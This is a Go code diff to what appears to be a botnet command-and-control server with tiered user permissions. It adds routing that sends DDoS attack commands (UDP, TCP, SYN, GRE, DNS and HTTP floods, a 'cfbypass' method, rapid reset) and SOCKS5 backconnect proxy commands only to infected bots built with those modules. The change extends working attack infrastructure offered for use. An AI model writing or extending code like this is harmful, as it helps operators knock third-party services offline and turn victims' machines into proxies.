@@ -123,6 +123,42 @@ func sendToSingleBot(botID string, command string) bool {
 	return false
 }
 
+// sendToAttackBots broadcasts a command only to bots that have attacks enabled.
+func sendToAttackBots(command string) {
+	botConnsLock.RLock()
+	defer botConnsLock.RUnlock()
+
+	sentCount := 0
+	for _, botConn := range botConnections {
+		if botConn.authenticated && botConn.attacksEnabled {
+			if _, err := botConn.conn.Write([]byte(command + "\n")); err != nil {
+				go removeBotConnection(botConn.botID)
+			} else {
+				sentCount++
+			}
+		}
+	}
+	logMsg("[COMMAND] Sent to %d attack-capable bots: %s", sentCount, command)
+}
+
+// sendToSocksBots broadcasts a command only to bots that have SOCKS enabled.
+func sendToSocksBots(command string) {
+	botConnsLock.RLock()
+	defer botConnsLock.RUnlock()
+
+	sentCount := 0
+	for _, botConn := range botConnections {
+		if botConn.authenticated && botConn.socksEnabled {
+			if _, err := botConn.conn.Write([]byte(command + "\n")); err != nil {
+				go removeBotConnection(botConn.botID)
+			} else {
+				sentCount++
+			}
+		}
+	}
+	logMsg("[COMMAND] Sent to %d SOCKS-capable bots: %s", sentCount, command)
+}
+
 // sendToBot sends a command to a specific bot by ID (full or partial match)
 // Supports partial ID matching (first N characters) for convenience
 // Tracks command origin in commandOrigin map so response routes back to user
@@ -450,12 +486,11 @@ func handleRequest(conn net.Conn) {
 						conn.Write([]byte("\033[38;5;46m✓ Attack completed and removed.\033[0m\n"))
 					}(atkID, conn, a)
 
-					// Build command string - send proxy URL to bots (they fetch & rotate without validation)
+					// Build command string - route only to attack-capable bots
 					if proxyMode && proxyURL != "" {
-						// Send proxy URL with -pu flag (bots fetch the list themselves)
-						sendToBots(fmt.Sprintf("%s %s %s %s -pu %s", method, ip, port, duration, proxyURL))
+						sendToAttackBots(fmt.Sprintf("%s %s %s %s -pu %s", method, ip, port, duration, proxyURL))
 					} else {
-						sendToBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration))
+						sendToAttackBots(fmt.Sprintf("%s %s %s %s", method, ip, port, duration))
 					}
 
 				case "!stop":
@@ -470,9 +505,9 @@ func handleRequest(conn net.Conn) {
 						delete(ongoingAttacks, k)
 					}
 					ongoingAttacksLock.Unlock()
-					// Send stop to all bots
-					sendToBots("!stop")
-					conn.Write([]byte(fmt.Sprintf("\033[38;5;46m✓ Stopped %d attack(s). Kill signal sent to all bots.\033[0m\r\n", count)))
+					// Send stop only to attack-capable bots
+					sendToAttackBots("!stop")
+					conn.Write([]byte(fmt.Sprintf("\033[38;5;46m✓ Stopped %d attack(s). Kill signal sent to attack-capable bots.\033[0m\r\n", count)))
 
 				case "ongoing":
 					if !c.canUseDDoS() {
@@ -673,17 +708,15 @@ func handleRequest(conn net.Conn) {
 					}
 					if len(parts) >= 2 {
 						arg := parts[1]
-						sendToBots(fmt.Sprintf("!socks %s", arg))
-						// Detect if it's a port (direct) or relay address (backconnect)
+						sendToSocksBots(fmt.Sprintf("!socks %s", arg))
 						if _, err := strconv.Atoi(arg); err == nil {
-							conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 direct listener on port %s sent to all bots\r\n\033[0m", arg)))
+							conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 direct listener on port %s sent to SOCKS-capable bots\r\n\033[0m", arg)))
 						} else {
-							conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 backconnect to %s sent to all bots\r\n\033[0m", arg)))
+							conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 backconnect to %s sent to SOCKS-capable bots\r\n\033[0m", arg)))
 						}
 					} else {
-						// No args — bots use pre-configured relay endpoints
-						sendToBots("!socks")
-						conn.Write([]byte("\033[1;35mSOCKS5 backconnect (pre-configured relay) sent to all bots\r\n\033[0m"))
+						sendToSocksBots("!socks")
+						conn.Write([]byte("\033[1;35mSOCKS5 backconnect (pre-configured relay) sent to SOCKS-capable bots\r\n\033[0m"))
 					}
 
 				case "!stopsocks":
@@ -691,8 +724,8 @@ func handleRequest(conn net.Conn) {
 						conn.Write([]byte("\033[1;31m❌ Permission denied: SOCKS commands require at least Pro level\r\n\033[0m"))
 						continue
 					}
-					sendToBots("!stopsocks")
-					conn.Write([]byte("\033[1;35mSOCKS5 backconnect stop sent to all bots\r\n\033[0m"))
+					sendToSocksBots("!stopsocks")
+					conn.Write([]byte("\033[1;35mSOCKS5 stop sent to SOCKS-capable bots\r\n\033[0m"))
 
 				case "!socksauth":
 					if !c.canUseShell() {
@@ -703,8 +736,8 @@ func handleRequest(conn net.Conn) {
 						conn.Write([]byte("Usage: !socksauth <username> <password>\r\n"))
 						continue
 					}
-					sendToBots(fmt.Sprintf("!socksauth %s %s", parts[1], parts[2]))
-					conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 auth updated (user: %s) on all bots\r\n\033[0m", parts[1])))
+					sendToSocksBots(fmt.Sprintf("!socksauth %s %s", parts[1], parts[2]))
+					conn.Write([]byte(fmt.Sprintf("\033[1;35mSOCKS5 auth updated (user: %s) on SOCKS-capable bots\r\n\033[0m", parts[1])))
 
 				case "!info":
 					if !c.canUseBotManagement() {
@@ -738,6 +771,18 @@ func handleRequest(conn net.Conn) {
 							targetCmd := strings.Join(parts[1:], " ")
 							bot := findBotByID(botID)
 							if bot != nil {
+								// Capability check
+								targetCmdLower := strings.ToLower(strings.Fields(targetCmd)[0])
+								atkCmds := map[string]bool{"!udpflood": true, "!tcpflood": true, "!http": true, "!https": true, "!tls": true, "!syn": true, "!ack": true, "!gre": true, "!dns": true, "!cfbypass": true, "!rapidreset": true, "!stop": true}
+								sckCmds := map[string]bool{"!socks": true, "!stopsocks": true, "!socksauth": true}
+								if atkCmds[targetCmdLower] && !bot.attacksEnabled {
+									conn.Write([]byte("\033[1;31m❌ Bot not built with attack modules\r\n\033[0m"))
+									continue
+								}
+								if sckCmds[targetCmdLower] && !bot.socksEnabled {
+									conn.Write([]byte("\033[1;31m❌ Bot not built with SOCKS module\r\n\033[0m"))
+									continue
+								}
 								if sendToBot(botID, targetCmd, conn, c) {
 									conn.Write([]byte(fmt.Sprintf("\033[1;33mCommand sent to bot %s: %s\r\n\033[0m", bot.botID, targetCmd)))
 									conn.Write([]byte("Waiting for response...\r\n"))
